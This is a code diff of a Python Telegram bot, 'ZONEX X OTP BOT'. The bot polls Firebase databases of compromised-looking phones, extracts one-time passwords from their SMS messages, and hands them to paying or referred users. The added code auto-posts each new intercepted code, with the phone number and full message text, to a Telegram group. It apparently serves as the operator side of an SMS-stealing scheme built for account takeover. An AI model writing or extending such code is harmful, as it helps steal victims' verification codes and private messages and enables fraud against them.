@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.3              ║
-║  High Level UI · Channel Gate · Admin    ║
+║        ZONEX X OTP BOT v6.6              ║
+║  High Level UI · 3 Force-Join · Alerts   ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -32,6 +32,9 @@ BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
 AUTO_REFRESH   = 10
 
+# Tumhara Group ID yahan direct set kar diya hai
+OTP_ALERT_GROUP_ID = -1004463422895  
+
 # ─── Firebase Configuration ──────────────────────────────────────────────────
 FIREBASE_CONFIG = {
     "apiKey": os.getenv("FIREBASE_API_KEY", ""),
@@ -51,10 +54,12 @@ FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
 DEVICES_PER_PAGE = 6
 WELCOME_HOURS  = 1
 
-CHANNELS = ["zonexarmy", "SMARTEARNERS011"]   # force-join channels
+# Yahan 3 jagah add kar di hain (2 Channel + 1 Group)
+CHANNELS = ["zonexarmy", "SMARTEARNERS011", "ZonexotpGroup"]   
 CH_NAMES = {
     "zonexarmy": "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
     "SMARTEARNERS011": "⚔️ SMART EARNERS",
+    "ZonexotpGroup": "💬 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏 𝐆𝐑𝐎𝐔𝐏",
 }
 
 # ─── Conversation states ──────────────────────────────────────────────────────
@@ -72,6 +77,7 @@ logger = logging.getLogger(__name__)
 
 # ─── Refresh lock ────────────────────────────────────────────────────────────
 _refresh_lock: asyncio.Lock = None
+sent_otps_cache = set() # Duplicate OTPs rokne ke liye
 
 # ─── Key generator ────────────────────────────────────────────────────────────
 def _gen_key_raw(length=10) -> str:
@@ -133,33 +139,23 @@ def save_data(d: dict):
         pass
 
 async def _push_firestore(d: dict):
-    if not GAPI_KEY:
-        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
-        return
+    if not GAPI_KEY: return
     try:
         payload = json.dumps(d, separators=(",", ":"))
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
-        async with _get_session().put(url, data=payload,
-                         headers={"Content-Type": "application/json"}) as r:
-            if r.status in (200, 201):
-                logger.info("✅ Firebase RTDB save successful")
-            else:
-                body = await r.text()
-                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
+        async with _get_session().put(url, data=payload, headers={"Content-Type": "application/json"}) as r:
+            pass
     except Exception as e:
         logger.warning(f"❌ Firebase RTDB push error: {e}")
 
 async def _load_firestore() -> bool:
-    if not GAPI_KEY:
-        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
-        return False
+    if not GAPI_KEY: return False
     try:
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
         async with _get_session().get(url) as r:
             if r.status == 200:
                 d = await r.json()
-                if not isinstance(d, dict):
-                    return False
+                if not isinstance(d, dict): return False
                 d.pop("activation_codes", None)
                 for uid, u in d.get("users", {}).items():
                     u.setdefault("key",            _gen_key_raw())
@@ -182,16 +178,7 @@ async def _load_firestore() -> bool:
                 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                 with open(DATA_FILE, "w") as f:
                     json.dump(d, f, indent=2)
-                
-                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                 return True
-            elif r.status == 401:
-                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
-            elif r.status == 404:
-                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
-            else:
-                body = await r.text()
-                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
     except Exception as e:
         logger.warning(f"Firebase load error: {e}")
     return False
@@ -199,41 +186,27 @@ async def _load_firestore() -> bool:
 data = load_data()
 
 async def _sync_from_firebase_on_startup():
-    loaded = await _load_firestore()
-    if not loaded:
-        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
-    else:
-        logger.info("✅ Using Firebase data")
+    await _load_firestore()
 
 # ─── Helper functions ─────────────────────────────────────────────────────────
 def get_referral_hours() -> float:
     return float(data.get("referral_hours", 1))
 
-# ─── Cache ────────────────────────────────────────────────────────────────────
 device_cache: dict   = {}
 otp_cache:    dict   = {}
 last_refresh         = "Never"
 fb_last_sync: dict   = {}
 fb_conn_status: dict = {}
 
-# ─── Global HTTP session ─────────────────────────────────────────────────────
 _http_session: Optional[aiohttp.ClientSession] = None
 
 def _get_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(
-            limit=30,
-            ttl_dns_cache=300,
-            enable_cleanup_closed=True,
-        )
-        _http_session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=aiohttp.ClientTimeout(total=6),
-        )
+        connector = aiohttp.TCPConnector(limit=30, ttl_dns_cache=300, enable_cleanup_closed=True)
+        _http_session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=6))
     return _http_session
 
-# ─── Time helpers ─────────────────────────────────────────────────────────────
 IST = timezone(timedelta(hours=5, minutes=30))
 
 def now_dt() -> datetime:
@@ -256,8 +229,7 @@ def time_left_str(uid: int) -> str:
     if diff.total_seconds() <= 0: return "⏰ Expired"
     h = int(diff.total_seconds() // 3600)
     m = int((diff.total_seconds() % 3600) // 60)
-    if h >= 24:
-        return f"✅ {h//24}d {h%24}h {m}m"
+    if h >= 24: return f"✅ {h//24}d {h%24}h {m}m"
     return f"✅ {h}h {m}m"
 
 def time_left_detailed(uid: int) -> str:
@@ -265,13 +237,11 @@ def time_left_detailed(uid: int) -> str:
     exp = expires_dt(uid)
     if not exp: return "❌ No Access"
     diff = exp - now_dt()
-    if diff.total_seconds() <= 0:
-        return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
+    if diff.total_seconds() <= 0: return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
     h = int(diff.total_seconds() // 3600)
     m = int((diff.total_seconds() % 3600) // 60)
     exp_str = exp.strftime('%d/%m/%Y %H:%M')
-    if h >= 24:
-        return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
+    if h >= 24: return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
     return f"✅ {h}h {m}m left\n   📅 Expires: {exp_str}"
 
 def add_hours(uid: int, hours: float):
@@ -283,11 +253,6 @@ def add_hours(uid: int, hours: float):
     data["users"][str(uid)]["expires_at"] = new_exp.strftime("%Y-%m-%d %H:%M:%S")
     save_data(data)
 
-def set_expiry(uid: int, dt: datetime):
-    data["users"][str(uid)]["expires_at"] = dt.strftime("%Y-%m-%d %H:%M:%S")
-    save_data(data)
-
-# ─── User helpers ─────────────────────────────────────────────────────────────
 def is_admin(uid: int) -> bool:
     return uid in ADMIN_IDS
 
@@ -319,7 +284,6 @@ def ensure_user(uid: int, username: str, name: str, referred_by: Optional[int] =
 def get_key(uid: int) -> str:
     return data["users"].get(str(uid), {}).get("key", "—")
 
-# ─── Channel helpers ──────────────────────────────────────────────────────────
 async def check_channels(bot, uid: int) -> tuple[bool, list[str]]:
     missing = []
     for ch in CHANNELS:
@@ -338,7 +302,6 @@ def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
     rows.append([InlineKeyboardButton("✅ Continue Verify", callback_data="check_join")])
     return InlineKeyboardMarkup(rows)
 
-# ─── OTP helpers ──────────────────────────────────────────────────────────────
 def extract_otp(text: str) -> Optional[str]:
     pats = [
         r'(?:OTP|One[\s\-]?Time[\s\-]?Password)\s*(?:is|:|\s)\s*(\d{4,8})',
@@ -353,21 +316,12 @@ def extract_otp(text: str) -> Optional[str]:
         r'(?:is|:)\s+(\d{8})\b',
         r'(?:is|:)\s+(\d{5})\b',
         r'(?:use|enter|share)\s+(?:this\s+)?(?:OTP|code)\s*[:\-]?\s*(\d{4,8})',
-        r'(?:do not|dont|never)\s+share.*?(\d{6})',
-        r'(?:do not|dont|never)\s+share.*?(\d{4})',
-        r'(?:do not|dont|never)\s+share.*?(\d{8})',
-        r'valid\s+for.*?(\d{6})',
-        r'expires?\s+in.*?(\d{6})',
         r'\b(\d{6})\b',
         r'\b(\d{8})\b',
         r'\b(\d{5})\b',
         r'\b(\d{4})\b',
     ]
-    skip = {
-        '2023','2024','2025','2026','2027','2028','2029','2030',
-        '1234','0000','1111','2222','3333','4444','5555','6666','7777','8888','9999',
-        '12345','123456','000000','111111',
-    }
+    skip = {'2023','2024','2025','2026','2027','2028','2029','2030','1234','0000','1111','12345','123456','000000'}
     for p in pats:
         m = re.search(p, text, re.IGNORECASE)
         if m and m.group(1) not in skip:
@@ -382,10 +336,7 @@ def _parse_ts_dt(ts) -> Optional[datetime]:
             return datetime.utcfromtimestamp(t / 1000) + timedelta(hours=5, minutes=30)
         if isinstance(ts, str) and ts.strip():
             clean = ts.replace(" | ", " ").replace("|", " ").strip()
-            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
-                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
-                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
-                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
+            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S", "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                 try: return datetime.strptime(clean[:19], fmt)
                 except: pass
     except: pass
@@ -399,25 +350,21 @@ def fmt_ts(ts) -> str:
             return (datetime.utcfromtimestamp(t/1000) + timedelta(hours=5, minutes=30)).strftime("%d/%m/%Y %H:%M")
         if isinstance(ts, str) and ts.strip():
             clean = ts.replace(" | ", " ").replace("|", " ").strip()
-            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
-                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
-                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
-                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
+            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S", "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                 try: return datetime.strptime(clean[:19], fmt).strftime("%d/%m/%Y %H:%M")
                 except: pass
             return clean[:16]
     except: pass
     return "—"
 
-# ─── Firebase ─────────────────────────────────────────────────────────────────
 async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
     base = url.rstrip("/")
     ep   = f"{base}/{path}.json" + (f"?auth={key}" if key else "")
     try:
         async with _get_session().get(ep) as r:
             return await r.json() if r.status == 200 else None
-    except Exception as e:
-        logger.warning(f"fb_get [{path}]: {e}")
+    except Exception:
+        pass
     return None
 
 async def fetch_otps(url: str, key: str, dev_id: str):
@@ -448,106 +395,66 @@ async def fetch_otps(url: str, key: str, dev_id: str):
             })
     return otps, last_any_dt
 
-# ══════════════════════════════════════════════════════════════════════════════
-# ★ ULTRA PHONE RESOLVER — Deep scanning for number ★
-# ══════════════════════════════════════════════════════════════════════════════
 def resolve_phone(info: dict, dev_id: str = "") -> str:
-    if not isinstance(info, dict):
-        return "—"
-
-    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na",
-           "undefined", "invalid", "no number", "not available", "unavailable"}
-
+    if not isinstance(info, dict): return "—"
+    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na", "undefined", "invalid", "no number"}
     def _clean(v):
-        if v is None:
-            return ""
+        if v is None: return ""
         s = str(v).strip()
-        if s.lower() in BAD:
-            return ""
+        if s.lower() in BAD: return ""
         return s
 
-    # 1. Standard top-level fields
     candidates = [
         info.get("mobNo"), info.get("phoneNumber"), info.get("phone_number"),
         info.get("PhoneNumber"), info.get("phone"), info.get("mobile"),
         info.get("Mobile"), info.get("mob"), info.get("number"),
         info.get("Number"), info.get("msisdn"), info.get("simNumber"),
-        info.get("sim_number"), info.get("contact"), info.get("whatsapp")
+        info.get("sim_number"), info.get("contact")
     ]
 
-    # 2. Array or Dict of SIMs
     sims = info.get("sims") or info.get("SIMs") or info.get("sim") or {}
-    if isinstance(sims, dict):
-        sims = list(sims.values())
+    if isinstance(sims, dict): sims = list(sims.values())
     if isinstance(sims, list):
         for s in sims:
             if not isinstance(s, dict): continue
-            candidates.extend([
-                s.get("phoneNumber"), s.get("phone"), s.get("number"),
-                s.get("mobNo"), s.get("mobile"), s.get("msisdn"),
-                s.get("simNumber"), s.get("Number")
-            ])
+            candidates.extend([s.get("phoneNumber"), s.get("phone"), s.get("number"), s.get("mobNo"), s.get("mobile"), s.get("msisdn")])
 
-    # 3. Nested Objects
-    for nest_key in ("device", "info", "data", "details", "meta", "extra", "simInfo"):
+    for nest_key in ("device", "info", "data", "details", "meta"):
         nest = info.get(nest_key)
         if isinstance(nest, dict):
-            candidates.extend([
-                nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"),
-                nest.get("mobile"), nest.get("number")
-            ])
-            # Nested SIMs
-            if "sims" in nest:
-                ns = nest["sims"]
-                if isinstance(ns, dict): ns = list(ns.values())
-                if isinstance(ns, list):
-                    for s in ns:
-                        if isinstance(s, dict):
-                            candidates.extend([
-                                s.get("phoneNumber"), s.get("phone"), s.get("number")
-                            ])
+            candidates.extend([nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"), nest.get("mobile")])
 
-    # 4. Deep recursive search (catches any field having 10-12 digits)
     found_deep = ""
     def _deep_scan(d):
         nonlocal found_deep
         if found_deep: return
         if isinstance(d, dict):
             for k, v in d.items():
-                if "phone" in str(k).lower() or "mob" in str(k).lower() or "number" in str(k).lower() or "sim" in str(k).lower():
+                if "phone" in str(k).lower() or "mob" in str(k).lower() or "number" in str(k).lower():
                     s = _clean(v)
                     if s and s.isdigit() and 10 <= len(s) <= 13:
                         found_deep = s
                         return
-                if isinstance(v, (dict, list)):
-                    _deep_scan(v)
+                if isinstance(v, (dict, list)): _deep_scan(v)
         elif isinstance(d, list):
-            for v in d:
-                _deep_scan(v)
+            for v in d: _deep_scan(v)
     _deep_scan(info)
-    if found_deep:
-        candidates.append(found_deep)
+    if found_deep: candidates.append(found_deep)
 
-    # Evaluate candidates
     for c in candidates:
         s = _clean(c)
         if s:
-            # Remove spaces and non-digits for check
             digits = re.sub(r"\D", "", s)
             if len(digits) >= 10:
                 return _normalize_phone(s)
 
-    # Last resort — device_id itself is a number
     if dev_id and dev_id.isdigit() and 10 <= len(dev_id) <= 13:
         return _normalize_phone(dev_id)
-
     return "—"
-
 
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
     clients = await fb_get(url, "clients", key)
-    
     if not isinstance(clients, dict): 
         fb_conn_status[label] = "error"
         return
@@ -559,24 +466,17 @@ async def refresh_firebase(cfg: dict):
         valid.append((dev_id, info, phone))
 
     async def _fetch_one(dev_id):
-        try:
-            return await fetch_otps(url, key, dev_id)
-        except Exception as e:
-            logger.warning(f"fetch_otps [{dev_id}]: {e}")
-            return [], None
+        try: return await fetch_otps(url, key, dev_id)
+        except: return [], None
 
     results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _, _ in valid])
 
     devs, otps_map = {}, {}
     for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
-        fb_status = bool(info.get("status") or info.get("isOnline") or
-                         info.get("is_online") or info.get("online"))
-        is_online  = fb_status  
-
-        ts_raw = (info.get("lastSeen") or info.get("last_seen") or
-                  info.get("lastOnline") or "")
+        fb_status = bool(info.get("status") or info.get("isOnline") or info.get("is_online") or info.get("online"))
+        ts_raw = (info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline") or "")
         devs[dev_id] = {
-            "online":    is_online,
+            "online":    fb_status,
             "phone":     phone,
             "name":      str(info.get("modelName") or info.get("model") or dev_id),
             "battery":   str(info.get("battery","—")),
@@ -595,24 +495,17 @@ async def refresh_firebase(cfg: dict):
 async def refresh_clients_only(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
-    
     if not isinstance(clients, dict):
         fb_conn_status[label] = "error"
         return
-        
     devs = {}
     for dev_id, info in clients.items():
-        if not isinstance(info, dict):
-            continue
+        if not isinstance(info, dict): continue
         phone = resolve_phone(info, dev_id)
-        fb_status = bool(info.get("status") or info.get("isOnline") or
-                         info.get("is_online") or info.get("online"))
-        is_online = fb_status  
-        
-        ts_raw    = (info.get("lastSeen") or info.get("last_seen") or
-                     info.get("lastOnline") or "")
+        fb_status = bool(info.get("status") or info.get("isOnline") or info.get("is_online") or info.get("online"))
+        ts_raw    = (info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline") or "")
         devs[dev_id] = {
-            "online":    is_online,
+            "online":    fb_status,
             "phone":     phone,
             "name":      str(info.get("modelName") or info.get("model") or dev_id),
             "battery":   str(info.get("battery", "—")),
@@ -623,46 +516,79 @@ async def refresh_clients_only(cfg: dict):
         }
     device_cache[label]   = devs
     fb_last_sync[label]   = now_dt().strftime("%H:%M:%S")
-    if label not in fb_conn_status:
-        fb_conn_status[label] = "ok"
+    if label not in fb_conn_status: fb_conn_status[label] = "ok"
+
+# ─── Text Builders ────────────────────────────────────────────────────────────
+def txt_new_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
+    phone = info.get('phone') or "—"
+    return (
+        f"╔══════════════════════════╗\n"
+        f"⚡ <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n"
+        f"╚══════════════════════════╝\n\n"
+        f" 🔐 <b>𝐘𝐎𝐔𝐑 𝐎𝐓𝐏 :</b>  <code>{e['otp']}</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📱 <b>𝐌𝐎𝐁𝐈𝐋𝐄 :</b> {phone}\n"
+        f"📩 <b>𝐒𝐄𝐍𝐃𝐄𝐑 :</b> {e['sender']}\n"
+        f"📅 <b>𝐃𝐀𝐓𝐄 :</b> {e['time'].split()[0] if ' ' in e['time'] else e['time']}\n"
+        f"⏰ <b>𝐓𝐈𝐌𝐄 :</b> {e['time'].split()[1] if ' ' in e['time'] else ''}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</b>\n\n"
+        f"{e['msg']}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
+        f"{BOT_DEV}"
+    )
+
+def txt_group_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
+    phone = info.get('phone') or "—"
+    country = "India 🇮🇳" if phone.startswith("+91") else "Unknown 🌍"
+    return (
+        f"⚡ <b>𝐙𝐎𝐍𝐄𝐗 𝐗 | 𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🔐 <b>𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐎𝐃𝐄</b>\n\n"
+        f"<code>\"{e['otp']}\"</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🌍 <b>𝐂𝐎𝐔𝐍𝐓𝐑𝐘</b>\n"
+        f"{country}\n\n"
+        f"📱 <b>𝐏𝐇𝐎𝐍𝐄 𝐍𝐔𝐌𝐁𝐄𝐑</b>\n"
+        f"{phone[:7]}..{phone[-4:] if len(phone)>7 else ''}\n\n"
+        f"👤 <b>𝐍𝐀𝐌𝐄</b>\n"
+        f"{e['sender']}\n\n"
+        f"🕒 <b>𝐓𝐈𝐌𝐄</b>\n"
+        f"{e['time']}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄</b>\n\n"
+        f"{e['msg']}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🤖 @ZonexXearningBot\n"
+        f"⚡ <b>𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏</b>"
+    )
 
 async def refresh_all():
     global last_refresh, _refresh_lock
-    if _refresh_lock is None:
-        _refresh_lock = asyncio.Lock()
+    if _refresh_lock is None: _refresh_lock = asyncio.Lock()
     if _refresh_lock.locked():
-        async with _refresh_lock:
-            return
+        async with _refresh_lock: return
     async with _refresh_lock:
         async def _safe(cfg):
-            try:
-                await refresh_firebase(cfg)
+            try: await refresh_firebase(cfg)
             except Exception as e:
-                logger.error(f"Refresh [{cfg['label']}]: {e}")
                 fb_conn_status[cfg["label"]] = "error"
         await asyncio.gather(*[_safe(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
-        logger.info(f"✅ Refresh done | {last_refresh}")
 
-# ─── Stats ────────────────────────────────────────────────────────────────────
 def _normalize_phone(ph: str) -> str:
     ph = str(ph).strip()
     digits = re.sub(r"[\s\-\.\(\)]", "", ph)
     pure = digits.lstrip("+")
-    if not pure.isdigit():
-        return ph
-    if len(pure) == 10 and pure[0] in "6789":
-        return f"+91{pure}"
-    if len(pure) == 12 and pure.startswith("91"):
-        return f"+{pure}"
-    if digits.startswith("+"):
-        return digits
+    if not pure.isdigit(): return ph
+    if len(pure) == 10 and pure[0] in "6789": return f"+91{pure}"
+    if len(pure) == 12 and pure.startswith("91"): return f"+{pure}"
+    if digits.startswith("+"): return digits
     return f"+{pure}"
 
 def count_online() -> int:
-    return sum(1 for dm in device_cache.values()
-               for d in dm.values()
-               if d.get("online"))
+    return sum(1 for dm in device_cache.values() for d in dm.values() if d.get("online"))
 
 def count_total() -> int:
     return sum(len(dm) for dm in device_cache.values())
@@ -671,23 +597,27 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    return [(lb, did, info)
-            for lb, dm in device_cache.items()
-            for did, info in dm.items()
-            if info.get("online")]
+    res = []
+    seen_phones = set()
+    for lb, dm in device_cache.items():
+        for did, info in dm.items():
+            if info.get("online"):
+                ph = info.get("phone", "—")
+                if ph != "—" and ph in seen_phones:
+                    continue
+                seen_phones.add(ph)
+                res.append((lb, did, info))
+    return res
 
 def resolve_label(esc: str) -> str:
     for cfg in data["firebase_configs"]:
-        if cfg["label"].replace(":","_") == esc or cfg["label"] == esc:
-            return cfg["label"]
+        if cfg["label"].replace(":","_") == esc or cfg["label"] == esc: return cfg["label"]
     return esc
 
-# ─── Text builders (High Level ERA Style) ─────────────────────────────────────
 def txt_welcome_panel(name: str, uid: int) -> str:
     tl  = time_left_str(uid)
     on  = count_online()
     otp = count_otps()
-    
     return (
         f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
         f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
@@ -709,55 +639,24 @@ def txt_device_card(label: str, dev_id: str) -> str:
     info  = device_cache.get(label, {}).get(dev_id, {})
     otps  = otp_cache.get(label, {}).get(dev_id, [])
     phone = info.get('phone') or "—"
-    battery   = str(info.get('battery','—'))
-    android   = str(info.get('android','—'))
-    network   = str(info.get('network','—'))
-    ip        = str(info.get('ip','—'))
-    last_seen = str(info.get('last_seen','—'))
-
-    header = (
+    return (
         f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
         f"📱 <b>𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎</b>\n"
         f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
         f"╭──────────────────────╮\n"
         f"📞 Number   › <code>{phone}</code>\n"
-        f"🔋 Battery  › {battery}\n"
-        f"🤖 Android  › {android}\n"
-        f"📡 Network  › {network}\n"
-        f"🌐 IP       › <code>{ip}</code>\n"
-        f"🕐 Last Seen › {last_seen}\n"
+        f"🔋 Battery  › {info.get('battery','—')}\n"
+        f"🤖 Android  › {info.get('android','—')}\n"
+        f"📡 Network  › {info.get('network','—')}\n"
+        f"🌐 IP       › <code>{info.get('ip','—')}</code>\n"
+        f"🕐 Last Seen › {info.get('last_seen','—')}\n"
         f"🔥 Database › {label}\n"
-        f"╰──────────────────────╯\n\n"
-    )
-
-    lines = [header]
-    if otps:
-        e = otps[0]
-        lines.append(
-            f"╭━━━ 🔑 <b>𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏</b> ━━━╮\n"
-            f"⚡ CODE   › <code>{e['otp']}</code>\n"
-            f"📤 Sender › {e['sender']}\n"
-            f"🕐 Time   › {e['time']}\n"
-            f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
-        )
-    else:
-        lines.append("\n❌ <i>Koi recent OTP nahi mila</i>")
-    return "".join(lines)
-
-def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
-    phone = info.get('phone') or "—"
-    return (
-        f"⚡ <b>OTP ALERT</b> ⚡\n"
-        f"{'━'*30}\n\n"
-        f"🔢  <b><code>{e['otp']}</code></b>\n\n"
-        f"{'━'*30}\n"
-        f"📞 <code>{phone}</code>\n"
-        f"📤 {e['sender']}\n"
-        f"🕐 {e['time']}\n"
-        f"{'─'*30}\n"
-        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n"
-        f"{'━'*30}\n"
-        f"🤖 <b>ZONEX X OTP Bot</b>  ·  {BOT_DEV}"
+        f"╰──────────────────────╯\n\n" +
+        (f"╭━━━ 🔑 <b>𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏</b> ━━━╮\n"
+         f"⚡ CODE   › <code>{otps[0]['otp']}</code>\n"
+         f"📤 Sender › {otps[0]['sender']}\n"
+         f"🕐 Time   › {otps[0]['time']}\n"
+         f"╰━━━━━━━━━━━━━━━━━━━━━━╯" if otps else "\n❌ <i>Koi recent OTP nahi mila</i>")
     )
 
 def txt_user_panel(uid: int) -> str:
@@ -925,10 +824,7 @@ def kb_admin() -> InlineKeyboardMarkup:
     ])
 
 def _fb_online_count(label: str) -> int:
-    return sum(
-        1 for d in device_cache.get(label, {}).values()
-        if d.get("online")
-    )
+    return sum(1 for d in device_cache.get(label, {}).values() if d.get("online"))
 
 def _fb_total_count(label: str) -> int:
     return len(device_cache.get(label, {}))
@@ -1429,7 +1325,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             devinfo = device_cache.get(lb, {}).get(did, devinfo)
             try:
                 await ctx.bot.send_message(
-                    uid, txt_otp_alert(lb, did, otp_to_show, devinfo), parse_mode="HTML")
+                    uid, txt_new_otp_alert(lb, did, otp_to_show, devinfo), parse_mode="HTML")
             except Exception as ae:
                 logger.warning(f"rfr alert: {ae}")
             try:
@@ -2585,6 +2481,29 @@ async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
     await refresh_all()
+    
+    # Auto Alert System (Job Queue ke through)
+    if OTP_ALERT_GROUP_ID != 0:
+        for label, devs in device_cache.items():
+            for dev_id, info in devs.items():
+                if not info.get("online"): continue
+                otps = otp_cache.get(label, {}).get(dev_id, [])
+                if otps:
+                    latest_otp = otps[0]
+                    if latest_otp.get("_dt") and (now_dt() - latest_otp["_dt"]).total_seconds() < 60:
+                        otp_key = f"{dev_id}_{latest_otp['otp']}_{latest_otp['time']}"
+                        if otp_key not in sent_otps_cache:
+                            sent_otps_cache.add(otp_key)
+                            if len(sent_otps_cache) > 1000:
+                                sent_otps_cache.clear()
+                            try:
+                                await ctx.bot.send_message(
+                                    chat_id=OTP_ALERT_GROUP_ID,
+                                    text=txt_group_otp_alert(label, dev_id, latest_otp, info),
+                                    parse_mode="HTML"
+                                )
+                            except Exception as ex:
+                                logger.warning(f"Group OTP send fail: {ex}")
 
 # ─── Main ─────────────────────────────────────────────────────────────────────
 async def _on_startup(app):
@@ -2595,7 +2514,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.3 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v6.6 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
